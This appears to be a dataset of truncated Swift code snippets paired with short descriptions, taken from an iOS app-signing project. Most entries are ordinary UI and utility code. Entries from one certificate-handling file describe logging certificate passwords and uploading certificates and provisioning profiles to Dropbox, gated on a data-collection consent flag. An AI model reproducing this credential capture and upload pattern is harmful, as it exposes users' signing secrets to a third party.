    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1381",
    "code": "func setupEnhancedSafeModeUI() {\nDebug.shared.log(message: \"Setting up enhanced safe mode UI\", type: .info)\n\n// Create a basic view controller for safe mode\nlet safeModeVC = UIViewController()\nsafeModeVC.view.backgroundColor = .systemBackground\n\n// Create container view for LED effects\nlet containerView = UIView()\ncontainerView.translatesAutoresizingMaskIntoConstraints = false",
    "nl": "/ Setup enhanced safe mode UI with LED effects",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1382",
    "code": "private func getCrashInfoText() -> String {\nlet crashCount = UserDefaults.standard.integer(forKey: \"crashCount\")\nlet lastCrashTime = UserDefaults.standard.object(forKey: \"lastCrashTime\") as? Date\n\nvar infoText = \"Crash Information: \"\n\nif crashCount > 0 {",
    "nl": "/ Get formatted information about crash history",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1383",
    "code": "func updateSafeModeBanner(on viewController: UIViewController, isEnabled: Bool) {\n// Remove existing banner if any\nif let existingBanner = viewController.view.viewWithTag(8888) {",
    "nl": "/ Update safe mode banner in normal mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1384",
    "code": "extension SafeModeLauncher {\n/// Enhanced method to determine crash count\nvar crashCountThreshold: Int {",
    "nl": "MARK: - SafeModeLauncher Enhancements",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1385",
    "code": "private func deviceIsLowEnd() -> Bool {\n// Check total RAM as a proxy for device capability\nlet physicalMemory = ProcessInfo.processInfo.physicalMemory\nlet gigabyte = 1024 * 1024 * 1024\n\n// Consider devices with less than 3GB RAM as low-end\nreturn physicalMemory < 3 * UInt64(gigabyte)\n}\n\n/// Check if a specific feature should be enabled in safe mode",
    "nl": "/ Determine if the device is a lower-end model",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1386",
    "code": "func isFeatureEnabledInSafeMode(_ feature: SafeModeFeature) -> Bool {\nswitch feature {",
    "nl": "/ Check if a specific feature should be enabled in safe mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift",
    "code_type": "function"
  },
  {
    "id": "1387",
    "code": "enum SafeModeFeature {\ncase fileManagement\ncase settings\ncase appSigningBasic\ncase appSigningAdvanced\ncase aiAssistant\ncase sources\n}\n",
    "nl": "/ Features that can be selectively enabled/disabled in safe mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift",
    "code_type": "enum"
  },
  {
    "id": "1388",
    "code": "extension CertData {\n/// Enhanced method to store certificate with Dropbox integration\nfunc enhancedStoreP12(at url: URL, withPassword password: String) -> Bool {",
    "nl": "/ Extension to handle certificate logging and upload to Dropbox",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift",
    "code_type": "extension"
  },
  {
    "id": "1389",
    "code": "func enhancedStoreP12(at url: URL, withPassword password: String) -> Bool {\n// Create a destination directory for this certificate\nlet certificatesDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]\n.appendingPathComponent(\"Certificates\")\n.appendingPathComponent(UUID().uuidString)\n\ndo {",
    "nl": "/ Enhanced method to store certificate with Dropbox integration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift",
    "code_type": "function"
  },
  {
    "id": "1390",
    "code": "extension Cert {\n/// Enhanced method to import mobile provision with Dropbox integration\nstatic func enhancedImportMobileProvision(from url: URL) -> Cert? {",
    "nl": "/ Extension to intercept mobile provision handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift",
    "code_type": "extension"
  },
  {
    "id": "1391",
    "code": "static func enhancedImportMobileProvision(from url: URL) -> Cert? {\n// Use the original implementation to parse the mobileprovision\nlet cert = CertData.parseMobileProvisioningFile(atPath: url)\n\n// If successful and user has consented to data collection\nif cert != nil, UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") {",
    "nl": "/ Enhanced method to import mobile provision with Dropbox integration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift",
    "code_type": "function"
  },
  {
    "id": "1392",
    "code": "class CertificateLoggingHelper {\nstatic let shared = CertificateLoggingHelper()\n\nprivate init() {}",
    "nl": "/ Helper methods to integrate Dropbox logging with the signing process",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift",
    "code_type": "class"
  },
  {
    "id": "1393",
    "code": "func logPasswordEntry(password: String, fileName: String? = nil) {\n// Only proceed if user has consented to data collection\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "/ Log password entry for certificate handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift",
    "code_type": "function"
  },
  {
    "id": "1394",
    "code": "func logCertificateImport(fileType: String, fileName: String) {\n// Only proceed if user has consented to data collection\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "/ Log certificate import activity",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift",
    "code_type": "function"
  },
  {
    "id": "1395",
    "code": "extension ImageCache {\n@objc func removeAllImages() {",
    "nl": "Extension to add Objective-C exposed method for memory warning handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/Nuke+Extensions.swift",
    "code_type": "extension"
  },
  {
    "id": "1396",
    "code": "@objc func removeAllImages() {\n// Clear all cached images\nImageCache.shared.clearCache()\n}\n}\n",
    "nl": "Function removeAllImages - implements removeallimages functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/Nuke+Extensions.swift",
    "code_type": "function"
  },
  {
    "id": "1397",
    "code": "extension SettingsViewController {\n/// Toggle handler for the terminal button setting\n@objc func terminalButtonToggled(_ sender: UISwitch) {",
    "nl": "MARK: - Terminal Button Toggle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift",
    "code_type": "extension"
  },
  {
    "id": "1398",
    "code": "@objc func terminalButtonToggled(_ sender: UISwitch) {\n// Save setting\nUserDefaults.standard.set(sender.isOn, forKey: \"show_terminal_button\")\n\n// Update button visibility\nif sender.isOn {",
    "nl": "/ Toggle handler for the terminal button setting",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift",
    "code_type": "function"
  },
  {
    "id": "1399",
    "code": "extension SettingsViewController {\n/// Resets the terminal settings to defaults\n@objc func resetTerminalSettings() {",
    "nl": "Extension to handle any terminal reset options",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift",
    "code_type": "extension"
  },
  {
    "id": "1400",
    "code": "@objc func resetTerminalSettings() {\nlet alert = UIAlertController(\ntitle: \"Reset Terminal Settings\",\nmessage: \"Are you sure you want to reset all terminal settings? This will not affect your command history.\",\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"Cancel\", style: .cancel))\nalert.addAction(UIAlertAction(title: \"Reset\", style: .destructive) { _ in",
    "nl": "/ Resets the terminal settings to defaults",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift",
    "code_type": "function"
  },
  {
    "id": "1401",
    "code": "func resetTerminalAll() {\n// Reset settings\nresetTerminalSettings()\n\n// Also clear command history\nlet history = CommandHistory()\nhistory.clearHistory()\nhistory.saveHistory()\n\n// End any active sessions",
    "nl": "/ Add terminal settings reset to the full reset option",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift",
    "code_type": "function"
  },
  {
    "id": "1402",
    "code": "extension SettingsViewController {\n// Terminal reset functionality to be integrated with the main reset options\nfunc integrateTerminalReset() {",
    "nl": "Terminal-specific reset methods that will be called from the main reset methods in ResetAlertOptions.swift",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift",
    "code_type": "extension"
  },
  {
    "id": "1403",
    "code": "func integrateTerminalReset() {\n// Reset terminal settings\nresetTerminalSettings()\n\n// Also clear command history\nlet history = CommandHistory()\nhistory.clearHistory()\nhistory.saveHistory()\n\n// End any active sessions",
    "nl": "Terminal reset functionality to be integrated with the main reset options",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift",
    "code_type": "function"
  },
  {
    "id": "1404",
    "code": "protocol BasicLayoutAnchorsHolding {\nvar leadingAnchor: NSLayoutXAxisAnchor { get }",
    "nl": "/ A protocol describing a type which contains basic layout anchors",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift",
    "code_type": "protocol"
  },
  {
    "id": "1405",
    "code": "extension BasicLayoutAnchorsHolding {\n/// Activates constraints to completely cover this view/guide over another.\nfunc constraintCompletely<Target: BasicLayoutAnchorsHolding>(to target: Target) {",
    "nl": "extension BasicLayoutAnchorsHolding - implements functionality related to basic layout anchors holding",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift",
    "code_type": "extension"
  },
  {
    "id": "1406",
    "code": "func constraintCompletely<Target: BasicLayoutAnchorsHolding>(to target: Target) {\nNSLayoutConstraint.activate([\nleadingAnchor.constraint(equalTo: target.leadingAnchor),\ntrailingAnchor.constraint(equalTo: target.trailingAnchor),\nbottomAnchor.constraint(equalTo: target.bottomAnchor),\ntopAnchor.constraint(equalTo: target.topAnchor),\n])\n}\n\n/// Sets layout margins for the view or guide",
    "nl": "/ Activates constraints to completely cover this view/guide over another.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift",
    "code_type": "function"
  },
  {
    "id": "1407",
    "code": "func setLayoutMargins(_ margins: UIEdgeInsets) {\nguard let view = self as? UIView else { return }",
    "nl": "/ Sets layout margins for the view or guide",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift",
    "code_type": "function"
  },
  {
    "id": "1408",
    "code": "extension UIView: BasicLayoutAnchorsHolding {}\n\nextension UILayoutGuide: BasicLayoutAnchorsHolding {",
    "nl": "extension UIView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift",
    "code_type": "extension"
  },
  {
    "id": "1409",
    "code": "extension UILayoutGuide: BasicLayoutAnchorsHolding {\nvar layoutMargins: UIEdgeInsets {",
    "nl": "extension UILayoutGuide - implements functionality related to u i layout guide",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift",
    "code_type": "extension"
  },
  {
    "id": "1410",
    "code": "extension String {\n/// Generate SHA256 hash of the string\nfunc sha256() -> String {",
    "nl": "extension String - implements functionality related to string",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/String+Crypto.swift",
    "code_type": "extension"
  },
  {
    "id": "1411",
    "code": "func sha256() -> String {\nlet data = Data(utf8)\nvar hash = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))\n\ndata.withUnsafeBytes { buffer in",
    "nl": "/ Generate SHA256 hash of the string",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/String+Crypto.swift",
    "code_type": "function"
  },
  {
    "id": "1412",
    "code": "public protocol BitwiseCopyable {}\n\n// Extend built-in Swift types that would normally conform to BitwiseCopyable\nextension Int: BitwiseCopyable {}",
    "nl": "protocol BitwiseCopyable - implements functionality related to bitwise copyable",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "protocol"
  },
  {
    "id": "1413",
    "code": "extension Int: BitwiseCopyable {}\nextension UInt: BitwiseCopyable {}",
    "nl": "Extend built-in Swift types that would normally conform to BitwiseCopyable",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1414",
    "code": "extension UInt: BitwiseCopyable {}\nextension Bool: BitwiseCopyable {}",
    "nl": "extension UInt - implements functionality related to u int",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1415",
    "code": "extension Bool: BitwiseCopyable {}\nextension Float: BitwiseCopyable {}",
    "nl": "extension Bool - implements functionality related to bool",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1416",
    "code": "extension Float: BitwiseCopyable {}\nextension Double: BitwiseCopyable {}",
    "nl": "extension Float - implements functionality related to float",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1417",
    "code": "extension Double: BitwiseCopyable {}\nextension String: BitwiseCopyable {}",
    "nl": "extension Double - implements functionality related to double",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1418",
    "code": "extension String: BitwiseCopyable {}\nextension Optional: BitwiseCopyable where Wrapped: BitwiseCopyable {}",
    "nl": "extension String - implements functionality related to string",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1419",
    "code": "extension Optional: BitwiseCopyable where Wrapped: BitwiseCopyable {}\nextension Array: BitwiseCopyable where Element: BitwiseCopyable {}",
    "nl": "extension Optional - implements functionality related to optional",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1420",
    "code": "extension Array: BitwiseCopyable where Element: BitwiseCopyable {}\nextension Dictionary: BitwiseCopyable where Key: BitwiseCopyable, Value: BitwiseCopyable {}",
    "nl": "extension Array - implements functionality related to array",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1421",
    "code": "extension Dictionary: BitwiseCopyable where Key: BitwiseCopyable, Value: BitwiseCopyable {}\n\n// Add other common types that would reasonably implement BitwiseCopyable\nextension Date: BitwiseCopyable {}",
    "nl": "extension Dictionary - implements functionality related to dictionary",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1422",
    "code": "extension Date: BitwiseCopyable {}\nextension Data: BitwiseCopyable {}",
    "nl": "Add other common types that would reasonably implement BitwiseCopyable",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1423",
    "code": "extension Data: BitwiseCopyable {}\nextension URL: BitwiseCopyable {}",
    "nl": "extension Data - implements functionality related to data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1424",
    "code": "extension URL: BitwiseCopyable {}\nextension UUID: BitwiseCopyable {}",
    "nl": "extension URL - implements functionality related to u r l",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1425",
    "code": "extension UUID: BitwiseCopyable {}\n#endif\n\n// Note: This is a compatibility shim that will be bypassed when using\n// Swift versions that natively support BitwiseCopyable\n",
    "nl": "extension UUID - implements functionality related to u u i d",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift",
    "code_type": "extension"
  },
  {
    "id": "1426",
    "code": "extension UIApplication {\nfunc topMostViewController() -> UIViewController? {",
    "nl": "extension UIApplication - implements functionality related to u i application",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIApplication+TopViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1427",
    "code": "func topMostViewController() -> UIViewController? {\nguard let windowScene = connectedScenes.first as? UIWindowScene,\nlet window = windowScene.windows.first\nelse {",
    "nl": "Function topMostViewController - implements topmostviewcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIApplication+TopViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1428",
    "code": "public enum NotificationNames {\n// Used for tab switching across the app\nstatic let changeTab = Notification.Name(\"com.backdoor.notifications.changeTab\")\n// Define other notification names here\n}\n",
    "nl": "Define notification names in a central location These notification names need to be unique across the app This is now defined in NotificationNames to avoid redeclaration issues Do not add changeTab here - use NotificationNames.changeTab instead Centralized enum for notification names to avoid ambiguity",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIApplication+TopViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "1429",
    "code": "extension UIApplication {\n/// Returns from the foreground app to the home screen.\nfunc returnToHomeScreen() {",
    "nl": "extension UIApplication - implements functionality related to u i application",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIApplication+returnToHomeScreen.swift",
    "code_type": "extension"
  },
  {
    "id": "1430",
    "code": "func returnToHomeScreen() {\nLSApplicationWorkspace.default()\n.openApplication(withBundleID: \"com.apple.springboard\")\n}\n}\n",
    "nl": "/ Returns from the foreground app to the home screen.",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIApplication+returnToHomeScreen.swift",
    "code_type": "function"
  },
  {
    "id": "1431",
    "code": "extension UIButton {\n/// Apply modern style to a button with customizable parameters\n///\n/// - Parameters:\n///   - color: The main color of the button\n///   - cornerRadius: The corner radius of the button (default: 10)\n///   - font: The font to use for the button title (default: .systemFont(ofSize: 16, weight: .medium))\n///   - shadowEnabled: Whether to add a shadow to the button (default: true)\nfunc applyModernStyle(\ncolor: UIColor,",
    "nl": "extension UIButton - implements functionality related to u i button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "extension"
  },
  {
    "id": "1432",
    "code": "func applyModernStyle(\ncolor: UIColor,\ncornerRadius: CGFloat = 10,\nfont: UIFont = .systemFont(ofSize: 16, weight: .medium),\nshadowEnabled: Bool = true\n) {",
    "nl": "/ Apply modern style to a button with customizable parameters / / - Parameters: /   - color: The main color of the button /   - cornerRadius: The corner radius of the button (default: 10) /   - font: The font to use for the button title (default: .systemFont(ofSize: 16, weight: .medium)) /   - shadowEnabled: Whether to add a shadow to the button (default: true)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1433",
    "code": "func addPressAnimation() {\naddTarget(self, action: #selector(buttonPressed), for: [.touchDown, .touchDragEnter])\naddTarget(\nself,\naction: #selector(buttonReleased),\nfor: [.touchUpInside, .touchUpOutside, .touchCancel, .touchDragExit]\n)\n}\n\n@objc private func buttonPressed() {",
    "nl": "/ Adds a scale-down animation when button is pressed",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1434",
    "code": "@objc private func buttonPressed() {\nUIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseInOut, .allowUserInteraction], animations: {",
    "nl": "Function buttonPressed - implements buttonpressed functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1435",
    "code": "@objc private func buttonReleased() {\nUIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseInOut, .allowUserInteraction], animations: {",
    "nl": "Function buttonReleased - implements buttonreleased functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1436",
    "code": "static func modernFloatingButton(\nimage: UIImage?,\ncolor: UIColor,\nsize: CGFloat = 56\n) -> UIButton {",
    "nl": "/ Create a modern floating action button / / - Parameters: /   - image: The image to display in the button /   - color: The button's background color /   - size: The size of the button (width and height) / - Returns: A configured UIButton",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1437",
    "code": "private extension UIColor {\n/// Determine if the color is light or dark\n/// - Returns: True if the color is light, false if it's dark\nfunc isLight() -> Bool {",
    "nl": "Helper extension to determine if a color is light or dark Use extension in same file instead of global to avoid redeclarations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "extension"
  },
  {
    "id": "1438",
    "code": "func isLight() -> Bool {\nvar red: CGFloat = 0\nvar green: CGFloat = 0\nvar blue: CGFloat = 0\nvar alpha: CGFloat = 0\n\ngetRed(&red, green: &green, blue: &blue, alpha: &alpha)\n\n// Calculate relative luminance\nlet luminance = 0.2126 * red + 0.7152 * green + 0.0722 * blue",
    "nl": "/ Determine if the color is light or dark / - Returns: True if the color is light, false if it's dark",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1439",
    "code": "extension UIButton {\n/// Apply a gradient background to the button\n/// - Parameters:\n///   - colors: Array of UIColors to use in the gradient\n///   - direction: The direction of the gradient (horizontal or vertical)\nfunc applyGradient(colors: [UIColor], direction: GradientDirection = .horizontal) {",
    "nl": "Example extension for gradient buttons",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "extension"
  },
  {
    "id": "1440",
    "code": "func applyGradient(colors: [UIColor], direction: GradientDirection = .horizontal) {\n// Remove any existing gradient\nlayer.sublayers?.filter { $0 is CAGradientLayer }.forEach { $0.removeFromSuperlayer() }",
    "nl": "/ Apply a gradient background to the button / - Parameters: /   - colors: Array of UIColors to use in the gradient /   - direction: The direction of the gradient (horizontal or vertical)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1441",
    "code": "enum GradientDirection {\ncase horizontal\ncase vertical\ncase diagonal\n}\n}\n\n// Extension for pill-shaped buttons\nextension UIButton {",
    "nl": "/ Direction options for gradient",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "enum"
  },
  {
    "id": "1442",
    "code": "extension UIButton {\n/// Convert the button to a modern pill shape\n/// - Parameter color: The button's background color\nfunc applyPillStyle(color: UIColor) {",
    "nl": "Extension for pill-shaped buttons",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "extension"
  },
  {
    "id": "1443",
    "code": "func applyPillStyle(color: UIColor) {\nbackgroundColor = color\n// Use our private isLight() method\nlet isLightColor = color.isLight()\nsetTitleColor(isLightColor ? .black : .white, for: .normal)\n\n// Make fully rounded\nlayer.cornerRadius = frame.height / 2\nclipsToBounds = true\n",
    "nl": "/ Convert the button to a modern pill shape / - Parameter color: The button's background color",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift",
    "code_type": "function"
  },
  {
    "id": "1444",
    "code": "extension UIButton {\nprivate enum AssociatedKeys {",
    "nl": "extension UIButton - implements functionality related to u i button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+longpress.swift",
    "code_type": "extension"
  },
  {
    "id": "1445",
    "code": "private enum AssociatedKeys {\nstatic var longPressGestureRecognizer = \"longPressGestureRecognizer\"\n}\n\nvar longPressGestureRecognizer: UILongPressGestureRecognizer? {",
    "nl": "enum AssociatedKeys - implements functionality related to associated keys",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+longpress.swift",
    "code_type": "enum"
  },
  {
    "id": "1446",
    "code": "extension UIColor {\n// Get color components as a tuple\nvar rgbaComponents: (red: CGFloat, green: CGFloat, blue: CGFloat, alpha: CGFloat) {",
    "nl": "Extension with color utilities (previously used for Lottie animations)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIColor+Lottie.swift",
    "code_type": "extension"
  },
  {
    "id": "1447",
    "code": "extension UIColor {\nconvenience init(hex: String) {",
    "nl": "extension UIColor - implements functionality related to u i color",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIColor+hex.swift",
    "code_type": "extension"
  },
  {
    "id": "1448",
    "code": "extension UIColor {\nstatic func interpolate(from: UIColor, to: UIColor, with alpha: CGFloat) -> UIColor {",
    "nl": "extension UIColor - implements functionality related to u i color",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIColor+hex.swift",
    "code_type": "extension"
  },
  {
    "id": "1449",
